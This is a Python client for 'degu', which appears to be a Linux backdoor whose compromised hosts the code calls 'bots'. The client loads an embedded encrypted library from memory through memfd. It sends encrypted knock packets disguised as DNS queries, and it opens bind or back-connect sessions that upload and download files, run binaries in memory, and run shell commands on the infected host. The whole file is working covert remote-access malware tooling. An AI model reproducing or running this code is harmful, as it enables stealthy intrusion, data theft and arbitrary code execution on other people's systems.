#!/usr/bin/env python3

import socket
import ctypes
import logging
import binascii
import os
import struct
import tempfile
import random
import string
import sys
import zlib
import base64

DEGUB64 = "@@BASE64@@"
PRIV    = "@@PRIV@@"

DEGU_EXE_UL     = b"<o)~"
DEGU_EXE_MEMFD  = b"<o):"
DEGU_DL         = b"Oo<<"
DEGU_UP         = b"Oo>>"

CONNECT_TIMEOUT = 10

def get_degu_lib() -> ctypes.CDLL :
    """load instance of degu library

    Returns:
        ctypes.CDLL: ctypes degu object
    """    

    lib = zlib.decompress(base64.b64decode(DEGUB64))
    fd = ctypes.CDLL(None).syscall(319,"",0)

    if fd < 0:
        temp = tempfile.TemporaryFile()
        fd = temp.fileno()
        if fd < 0:
            print("FATAL: error creating temporary lib fd")
        
    ret = os.write(fd,lib)

    if ret < 0:
        print("FATAL: error writing to temporary lib fd")
        sys.exit(-1)
    
    return ctypes.CDLL(f"/proc/self/fd/{fd}")

def mock_dns() -> bytes:
    """generate random dns query for degu knock

    Returns:
        byte: first 32 bytes of DNS query header
    """    
    
    names = ["google.com","youtube.com","facebook.com","wikipedia.org","yahoo.com","amazon.com",
    "twitter.com","live.com","instagram.com","reddit.com","linkedin.com","blogspot.com","netflix.com",
    "twitch.tv","whatsapp.com","microsoft.com","bing.com","ebay.com","github.com","stackoverflow.com",
    "office.com","msn.com","paypal.com","imgur.com","wordpress.com","apple.com","dropbox.com",
    "tumblr.com","bbc.com","force.com","salesforce.com","roblox.com","spotify.com","soundcloud.com",
    "discordapp.com","medium.com","mediafire.com","godaddy.com","etsy.com","duckduckgo.com",
    "slack.com","dailymotion.com","speedtest.net","blogger.com"]

    transac_id = struct.pack("H",random.randint(0,65535))
    flags = b"\x01\x00\x00\x01\x00\x00\x00\x00\x00"
    name = random.choice(names)
    len_name = struct.pack(">H",len(name))
    rest = b"\x00\x01\x00\x01"
    dns_data = transac_id + flags + len_name + name.encode() + rest + 32*b"\x00"
    return dns_data[:32]


def _create_bin_string( bin: bytes, args: bytes, memfd: bool = False ) -> bytes:
    """ create payload for memory execution
    
    Args:
        bin (byte): binary to send
        args (byte[]): argument to binary don't forget args[0] for exe name
        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

    Returns:
        byte: unencrypted byte stream to send
    """ 
    mybin = open(bin ,"rb").read()
    lbin = struct.pack("I",len(mybin))
    argc = struct.pack("B",len(args.split()))
    largs = struct.pack("I",len(args))
    payload=b""
    if memfd:
        payload += DEGU_EXE_MEMFD
    else:
        payload += DEGU_EXE_UL

    payload += lbin + largs + argc + args + mybin
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

def _create_dl_string( path: bytes ) -> bytes :
    """create payload for file download

    Args:
        path (byte): file path on server to download

    Returns:
        byte: unencrypted byte stream to send
    """    
    lpath = struct.pack("I",len(path))
    payload = DEGU_DL + lpath + path
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

def _create_up_string( rpath: bytes, lfile: bytes ) -> bytes :
    """create payload for file upload

    Args:
        path (byte): path to upload to
        file (byte): local file to read

    Returns:
        byte: unencrypted byte stream to send
    """    
    lpath = struct.pack("I",len(rpath))
    data = None
    try:
        data = open(lfile,"rb").read()
    except FileNotFoundError:
        # XXX 
        return None
    ldata = struct.pack("I",len(data))
    payload = DEGU_UP + ldata + lpath + rpath + data
    size = len(payload)
    delta = 32 - (size % 32)
    data = payload + delta * b"\0"
    return data

class degu(object):
    def __init__( self, host: str, priv: str=PRIV, kport: int=53 ) -> None :
        """main degu object

        Args:
            host (str): ip addr or hostname of degu server
            priv (str): hex stream of private data key (01020304....)
            kport (int): custom knock port for non root degu . Defaults to 53 for root usage.
            lib (str, optional): degu.so library location . Defaults to DEGU global variable.
        """        
        self.priv = binascii.unhexlify(priv)
        self.log = logging.getLogger(__name__)
        self.kport = kport
        if os.getenv("DEGU_KPORT"):
            try:
                self.kport = int(os.getenv("DEGU_KPORT"))
            except ValueError: 
                self.log.error("DEGU_KPORT is not int value")

        try:
            os.putenv("_LC","1")
            self.lib =  get_degu_lib()
        except OSError:
            self.log.error("no degu lib found")
            sys.exit(-1)
        self.host = host
        self.bot_pubkey = None
        self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    
    
    def xbuf( self, data: bytes ) -> bytes :
        """encrypt/decrypt data with session context

        Args:
            data (bytes): data to cipher with current aes context

        Returns:
            bytes: ciphered data
        """        
        if not data:
            return None
        self.lib.xbuf(self.bot_pubkey,self.priv,data,len(data))
        return data

    def xcrypt_knock( self, data: bytes ) -> bytes :
        """encrypt knock data with knock key

        Args:
            data (bytes): knock to cipher/decipher

        Returns:
            bytes: ciphered/deciphered data
        """        
        
        self.lib.xnock(data,len(data))
        return data

    def sign_msg( self, data: bytes ) -> bytes :
        """get data signature

        Args:
            data (bytes): data to sign

        Returns:
            bytes: signature
        """        
        sig = ctypes.create_string_buffer(64)
        self.lib.xsig(sig,data,len(data),self.priv)
        return sig.raw

    def mkbuf_knock( self, addr: bytes ) -> bytes :
        """make knock message

        Args:
            addr (bytes): target host

        Returns:
            bytes: ciphered knock buffer with DNS header
        """        

        buf_rand = mock_dns()
        self.xcrypt_knock(buf_rand)
        self.log.debug("knocking %s"%addr)
        payload = None
        if addr.startswith(b":"):
            try:
                port = int(addr[1:])
                self.port = port
                self.log.debug("trying remote bind on %s:%i"%(self.host,port))
                f = struct.pack("H",port)
                payload = buf_rand + b"\xb0\x0b" + f + b"\0"*1000
            except ValueError:
                self.log.error(f"Port {addr[1:]} is invalid")
        else:
            try:
                sip,sport = addr.split(b":")
                self.log.debug(f"trying backconnect on {sip}:{sport}")
                ip = bytes(map(int, sip.split(b'.')))
                port = int(sport)
                f = struct.pack("H",port)
                payload = buf_rand + b"\xc4\x11" + ip + f + b"\0"*1000
            except Exception as exc:
                self.log.error("addr %s is invalid : %s"%(addr,exc))
                return None
        if payload:
            return self.xcrypt_knock( payload )
        return None

    def mkbuf_upload( self, lfile: bytes , rpath: bytes, pub: bytes ) -> bytes :
        """make upload buffer

        Args:
            file (byte): local filename to read
            path (byte): remote path to use for upload
            pub (byte): public key of degu instance

        Returns:
            bytes: ciphered upload data command
        """        

        if not self.bot_pubkey :
            self.bot_pubkey = self.xcrypt_knock( pub )
        data = _create_up_string( rpath , lfile )
        return self.xbuf( data )
        
    def mkbuf_mem_exec( self, bin: bytes, param: list, pub: bytes, memfd: bool=False ) -> bytes :
        """make memexec buffer

        Args:
            bin (byte): binary to send
            param (byte[]): arguments to binary don't forget args[0] for exe name
            pub (byte): public key of degu instance
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            byte: encrypted byte buffer to send

        """        
    
        if not self.bot_pubkey :
            self.bot_pubkey = self.xcrypt_knock( pub )
        data = _create_bin_string( bin, param, memfd=memfd )
        return self.xbuf( data )

    def mkbuf_download( self, path: bytes, pub: bytes ) -> bytes :
        """ make download buffer

        Args:
            path (bytes): file path on server to download
            pub (bytes): public key of degu instance

        Returns:
            bytes: encrypted byte buffer to send
        """
        if not self.bot_pubkey :            
            self.bot_pubkey = self.xcrypt_knock(pub) ## here for user !!!!
        data = _create_dl_string( path )
        return self.xbuf(data)

    def mkbuf_ghost_exec( self, mycmd: bytes ) -> bytes :
        """make ghost exec buffer

        Args:
            mycmd (bytes): raw shell command

        Returns:
            bytes: encrypted byte buffer to send
        """        

        rand = mock_dns()
        self.xcrypt_knock(rand)
        sig  = self.sign_msg(mycmd)
        payload = rand + b"\xc0\x57" + struct.pack("H",len(mycmd)) +  mycmd + sig + b'\x00'*1000
        return self.xcrypt_knock(payload)

    def rdownload( self, path: str, lport: int, timeout: int=5 ) -> bytes :
        """ reverse connect download file from bot to client

        Args:
            path (str): file path on server to download
            lport (int): local port to listen to
            timeout (int, optional): timeout to file receive. Defaults to 5.

        Returns:
            bytes: contents of file or None if error
        """        

        self.log.info(f"CB downloading {path}")
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            serv.bind(('0.0.0.0', int(lport)))
        except PermissionError as e :
            self.log.error(f"unable to bind on {int(lport)}: {e}")
            return None
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_download(path.encode(),pub)
        s.send(data)
        recvdata = b""
        while 1:
            tmp = s.recv(4096)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.xbuf(recvdata)
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            self.log.error("no recv :(")
        s.close()
        return None

    def download(self, path: str ) -> bytes :
        """ bind connect download file from bot to client

        Args:
            path (str): file path on server to download

        Returns:
            bytes: contents of file or None if error
        """        
        
        self.log.info(f"Downloading {path}")
        s = socket.socket()
        try:
            s = socket.create_connection((self.host, self.port), timeout=CONNECT_TIMEOUT)
            s.setblocking(True)
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return None
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return None
        except socket.timeout as e:
            self.log.error(f"Timeout connecting to {self.host}:{self.port} : {e}")
            return None
        

        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_download( path.encode(), pub )
        s.send(data)
        recvdata = b""
        while 1:
            tmp = s.recv(4096)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.xbuf(recvdata)
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            self.log.error("no recv :(")
        s.close()
        return None

    def upload(self, file: str , path: str ) -> int :
        """bind connect upload file from client to bot

        Args:
            file (str): local filename to read
            path (str): remote path to use for upload
        Returns:
            int: len of uploaded data or None
        """        
        self.log.info(f"Uploading {file} -> {path}")
        s = socket.socket()
        try:
            s = socket.create_connection((self.host, self.port), timeout=CONNECT_TIMEOUT)
            s.setblocking(True)
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return 
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return 
        except socket.timeout as e:
            self.log.error(f"Timeout connecting to {self.host}:{self.port} : {e}")
            return 
        
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload( file.encode(), path.encode(), pub)
        if not data :
            return None
        ret = s.send(data)
        s.close()
        return ret

    def rupload(self, file: str , path: str, lport: int, timeout: int=5 ) -> int :
        """ reverse connect upload file from client to bot

        Args:
            file (str): local filename to read
            path (str): remote path to use for upload
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.

        Returns:
            int: len of uploaded data or None
        """        

        self.log.info(f"cb Uploading {file} -> {path}")
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            serv.bind(('0.0.0.0', int(lport)))
        except PermissionError as e :
            self.log.error(f"unable to bind on {int(lport)}: {e}")
            return None
        
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload(file.encode(), path.encode(), pub)
        if not data :
            return None
        ret = s.send(data)
        s.close()
        return ret

    def helper(self, bin: str, param: str, memfd: bool=False) -> socket.socket :
        """ bind connect execute binary in memory and return socket for reuse

        Args:
            bin (str): path to helper binary to use
            param (str): arguments to binary don't forget args[0] for exe name
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            socket.socket: socket object from degu session
        """        
        self.log.info("Sending bin %s params '%s' "%(bin,param))
        s = socket.socket()
        try:
            s = socket.create_connection((self.host, self.port), timeout=CONNECT_TIMEOUT)
            s.setblocking(True)
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return None
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return None
        except socket.timeout as e:
            self.log.error(f"Timeout connecting to {self.host}:{self.port} : {e}")
            return None
        
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin.encode(), param.encode(), pub, memfd=memfd)
        s.send(data)
        return s

    def rhelper(self, bin: str, param: str, lport: int, timeout: int=5, memfd: bool=False) -> socket.socket :
        """ reverse connect execute binary in memory and return socket for reuse

        Args:
            bin (str): path of helper binary to use
            param (str): arguments to binary don't forget args[0] for exe name
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.
            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.

        Returns:
            socket: socket object from degu session
        """
        self.log.info("Sending bin %s params '%s' "%(bin,param))
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin.encode(), param.encode(), pub, memfd=memfd)
        s.send(data)
        return s

    def mem_exec(self, bin: str, param: str, memfd: bool=False) -> None :
        """ bind connect execute binary in memory and close socket

        Args:
            bin (str): path to executable binary to use
            param (str): arguments to binary don't forget args[0] for exe name
        """        

        self.log.info("Sending bin %s params '%s' "%(bin,param))
        s = socket.socket()
        try:
            s = socket.create_connection((self.host, self.port), timeout=CONNECT_TIMEOUT)
            s.setblocking(True)
        except ConnectionRefusedError as e:
            self.log.error(f"Unable to connect to {self.host}:{self.port} : {e}")
            return 
        except socket.gaierror as e:
            self.log.error(f"Unable to resolv {self.host} : {e}")
            return 
        except socket.timeout as e:
            self.log.error(f"Timeout connecting to {self.host}:{self.port} : {e}")
            return 
        
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin.encode(), param.encode(), pub, memfd=memfd)
        s.send(data)
        s.close()

    def rmem_exec( self, bin: str, param: str, lport: int, timeout: int=5, memfd: bool=False ) -> None :
        """ reverse connect execute binary in memory and close socket

        Args:
            bin (str): path executable binary to use
            param (str): arguments to binary don't forget args[0] for exe name
            lport (int): local port to listen to
            timeout (int, optional): timeout to file send. Defaults to 5.
        """
        self.log.info("Sending bin %s params '%s' "%(bin, param))
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(bin.encode(), param.encode(), pub, memfd=memfd)
        s.send(data)
        s.close()

    def knock( self, data: str ) -> bool :
        """ send knock to bot

        Args:
            data (str): knock message ip:port for cb or just :port for bind

        Returns:
            bool: True is knock is send False otherwise
        """        
        buf = self.mkbuf_knock(data.encode())
        if not buf:
            return
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        try:
            s.sendto(buf,0,(self.host,self.kport))
            return True
        except socket.gaierror as e:
            self.log.error(f"unable to resolv no knocking {self.host} : {e}")
            return False
        finally:
            s.close()

    def ghost_exec( self, mycmd: str ) -> None :
        """ execute system() command on bot, limited cmd to 1300 char no return

        Args:
            mycmd (str): shell command
        """        

        self.log.info(f"ghost executing {mycmd}")
        buf = self.mkbuf_ghost_exec(mycmd.encode())
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        self.log.debug("executing : %s"%mycmd)
        s.sendto(buf,0,(self.host,self.kport))
        s.close()

    def __str__(self):
        return f"<DEGU ({self.host})>"

    def __repr__(self):
        return f"<DEGU ({self.host})>"

    @staticmethod
    def getpub():
        """ get degu internal info """
        lib = get_degu_lib()
        lib.xpub()

    @staticmethod
    def keygen():
        """ degu keygen function """
        file = '/tmp/.' + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
        lib =  get_degu_lib()
        lib.keygen(file.encode())
        toexec = open(file,"rb").read()
        exec( toexec, globals() )
        os.unlink(file)
        tiv  = ["0x%02x"%c for c in binascii.unhexlify(iv)]
        tkno = ["0x%02x"%c for c in binascii.unhexlify(knock)]
        tpub = ["0x%02x"%c for c in binascii.unhexlify(pub)]
        ret  = "#define IV            { " + ",".join(tiv) + "}\n"
        ret += "#define KNOCK_KEY     { " + ",".join(tkno) + "}\n"
        ret += "#define MASTER_PUBKEY { " + ",".join(tpub) + "}\n"
        ret += f'\n// PRIVATE_KEY="{priv}"\n'
        return ret
